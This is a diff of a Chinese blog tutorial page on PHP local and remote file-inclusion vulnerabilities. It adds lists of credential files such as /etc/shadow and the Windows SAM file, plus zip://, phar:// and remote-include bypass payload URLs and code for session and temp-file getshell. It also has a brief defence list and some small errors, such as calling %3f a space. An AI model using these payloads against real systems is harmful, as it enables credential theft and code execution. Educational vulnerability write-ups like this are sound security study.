@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/2.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/3.png">
 <meta property="article:published_time" content="2021-01-02T06:21:53.000Z">
-<meta property="article:modified_time" content="2021-01-23T03:24:38.499Z">
+<meta property="article:modified_time" content="2021-03-17T09:29:59.390Z">
 <meta property="article:author" content="jiulin">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/1.png">
@@ -225,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-23 11:24:38" itemprop="dateModified" datetime="2021-01-23T11:24:38+08:00">2021-01-23</time>
+                <time title="修改时间：2021-03-17 17:29:59" itemprop="dateModified" datetime="2021-03-17T17:29:59+08:00">2021-03-17</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -256,7 +256,7 @@
 
 
 
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。如果文件包含函数加载的参数没有经过过滤或者严格的定义，就可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
 <p>文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要文件被包含，其内容会被包含文件包含，并以当前服务器脚本语言执行。</p>
 <p>各类文件包含的利用方法都是一样的，只是包含文件的位置不同，从而做出了区分。</p>
 <p>主要分为<strong>本地文件包含漏洞</strong>和<strong>远程文件包含漏洞</strong>。</p>
@@ -270,7 +270,14 @@
 <p>然后我们包含<code>file.txt</code>文件：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/1.png"></p>
 <p>如果包含的文件内容不符合php语言语法的，会直接将文件内容输出。</p>
-<p>像上面这样的漏洞叫做无限制本地文件包含漏洞。如果开发者做了一定的限制，如限制了包含文件的后缀，如下：</p>
+<p>常见的敏感目录：</p>
+<p>linux</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure>
+
+<p>windows</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br></pre></td></tr></table></figure>
+
+<p>如果开发者做了一定的限制，如限制了包含文件的后缀，如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $file;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure>
 
 <p>这样的话，我们的<code>file.txt</code>就会被识别为<code>file.txt.php</code>，从而无法找到要包含的文件。</p>
@@ -285,9 +292,55 @@
 </blockquote>
 <h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>方法：文件结尾加点号。</p>
 <p>条件：在 windows OS 中点号需要长于256。</p>
-<h2 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h2><blockquote>
-<p>引自Freebuf：<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/182280.html">《Web安全实战系列：文件包含漏洞》</a></p>
-</blockquote>
+<h3 id="zip和phar伪协议绕过"><a href="#zip和phar伪协议绕过" class="headerlink" title="zip和phar伪协议绕过"></a>zip和phar伪协议绕过</h3><p>适用于验证包含文件为特定后缀时。</p>
+<p><code>zip://</code></p>
+<p>新建zip文件，里面压缩着脚本，然后构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;zip:&#x2F;&#x2F;php.zip%23php.jpg</span><br><span class="line"></span><br><span class="line">%23是#的url编码</span><br></pre></td></tr></table></figure>
+
+<p>即可绕过jpg后缀名。</p>
+<p><code>phar://</code></p>
+<p>要求：php大于5.3.0、php.ini的参数phar.readonly设置为off</p>
+<p>先用phar类打包一个phar标准包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/phartest2.zip&#x27;</span>, <span class="number">0</span>,<span class="string">&#x27;phartest2&#x27;</span>,Phar::ZIP) ; </span><br><span class="line">$x=file_get_contents(<span class="string">&#x27;./php.php&#x27;</span>);</span><br><span class="line">$p-&gt;addFromString(<span class="string">&#x27;a.jpg&#x27;</span>, </span><br><span class="line">$x); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>会生成一个zip的压缩文件。然后构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;php.jpg</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当包含的文件在远程服务器上时，就形成了远程文件包含。</p>
+<p>需要<code>php.ini</code>中<code>allow_url_include = on</code>以及<code>allow_url_fopen=on</code>，且所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是<code>php</code>)，否则我们将得到远程服务器的信息，而非目标服务器。</p>
+<p>所以我们在利用远程包含文件漏洞时，不能用<code>.php</code>后缀的文件，就要把<code>.php</code>改为<code>.txt</code>一类的后缀来包含。</p>
+<p>当开发者对远程文件包含进行了后缀名限制时，我们也有很多绕过方法。</p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $file;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><p>方法：结尾加问号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt?</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="井号绕过"><a href="#井号绕过" class="headerlink" title="井号绕过"></a>井号绕过</h3><p>方法：结尾加<code>#</code>（url中为<code>%23</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>方法：结尾加空格（url中为<code>%3f</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%3f</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol>
+<li>PHP 中使用 <code>open_basedir</code> 配置限制访问在指定的区域</li>
+<li>过滤.（点）/（反斜杠）\（正斜杠）</li>
+<li>禁止服务器远程文件包含</li>
+</ol>
+<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>当我们的目标站点没有上传功能并且也不能远程文件包含时，我们就可以考虑包含session文件或者其它可以记录客户端输入的文件。</p>
+<p><strong>原理</strong></p>
+<p>当我们访问网站时，服务器日志会记录我们的行为，当我们的访问链接中含义恶意代码时，也会被记录到日志中，从而通过包含日志可以进行getshell。</p>
+<p><strong>利用手段</strong></p>
 <p>由于我们可以通过<code>phpinfo</code>的信息来获取到session的存储位置，当其中的内容可控时，我们就可以将恶意代码存储到该目录下，从而getshell。</p>
 <p>通过phpinfo的信息，获取到session.save_path为/var/lib/php/session：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/2.png"></p>
@@ -308,31 +361,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@6da845537b27 session]# cat sess_83317220159fc31cd7023422f64bea1a</span><br><span class="line">username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。</p>
-<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当包含的文件在远程服务器上时，就形成了远程文件包含。</p>
-<p>远程包含需要<code>php.ini</code>中<code>allow_url_include = on</code>以及<code>allow_url_fopen=on</code>，且所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是<code>php</code>)，否则我们将得到远程服务器的信息，而非目标服务器。</p>
-<p>所以我们在利用远程包含文件漏洞时，不能用<code>.php</code>后缀的文件，就要把<code>.php</code>改为<code>.txt</code>一类的后缀来包含。</p>
-<p>当开发者对远程文件包含进行了后缀名限制时，我们也有很多绕过方法。</p>
-<p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $file;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><p>方法：结尾加问号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt?</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="井号绕过"><a href="#井号绕过" class="headerlink" title="井号绕过"></a>井号绕过</h3><p>方法：结尾加<code>#</code>（url中为<code>%23</code>）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%23</span><br></pre></td></tr></table></figure>
-
-
-
-<p>空格绕过</p>
-<p>方法：结尾加空格（url中为<code>%3f</code>）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%3f</span><br></pre></td></tr></table></figure>
-
-
-
+<p>类似的还有<strong>临时文件包含</strong>。</p>
+<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>包含的文件名的获取方法：爆破、配合phpinfo页面的php variables，获取到上传文件的存储路径和临时文件名。</p>
 <hr>
 <h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>PHP伪协议事实上就是支持的协议与封装协议，共十二种。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/3.png"></p>
@@ -601,7 +632,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%A6%82%E8%BF%B0"><span class="nav-number">2.1.</span> <span class="nav-text">文件包含概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.3.</span> <span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD"><span class="nav-number">2.3.1.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="nav-number">2.3.2.</span> <span class="nav-text">路径长度截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="nav-number">2.3.3.</span> <span class="nav-text">点号截断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.</span> <span class="nav-text">session文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.5.</span> <span class="nav-text">远程文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.1.</span> <span class="nav-text">问号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.2.</span> <span class="nav-text">井号绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.</span> <span class="nav-text">伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#file"><span class="nav-number">3.1.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">3.2.</span> <span class="nav-text">php:&#x2F;&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input"><span class="nav-number">3.2.1.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter"><span class="nav-number">3.2.2.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zlib-amp-zip-amp-bzip2"><span class="nav-number">3.3.</span> <span class="nav-text">zlib:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data"><span class="nav-number">3.4.</span> <span class="nav-text">data:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar"><span class="nav-number">3.5.</span> <span class="nav-text">phar:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-number">3.6.</span> <span class="nav-text">ftp:&#x2F;&#x2F;</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%A6%82%E8%BF%B0"><span class="nav-number">2.1.</span> <span class="nav-text">文件包含概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.3.</span> <span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD"><span class="nav-number">2.3.1.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="nav-number">2.3.2.</span> <span class="nav-text">路径长度截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="nav-number">2.3.3.</span> <span class="nav-text">点号截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zip%E5%92%8Cphar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.4.</span> <span class="nav-text">zip和phar伪协议绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.</span> <span class="nav-text">远程文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.1.</span> <span class="nav-text">问号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.2.</span> <span class="nav-text">井号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.3.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">2.4.4.</span> <span class="nav-text">防御措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.5.</span> <span class="nav-text">session文件包含</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.</span> <span class="nav-text">伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#file"><span class="nav-number">3.1.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">3.2.</span> <span class="nav-text">php:&#x2F;&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input"><span class="nav-number">3.2.1.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter"><span class="nav-number">3.2.2.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zlib-amp-zip-amp-bzip2"><span class="nav-number">3.3.</span> <span class="nav-text">zlib:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data"><span class="nav-number">3.4.</span> <span class="nav-text">data:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar"><span class="nav-number">3.5.</span> <span class="nav-text">phar:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-number">3.6.</span> <span class="nav-text">ftp:&#x2F;&#x2F;</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -617,14 +648,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
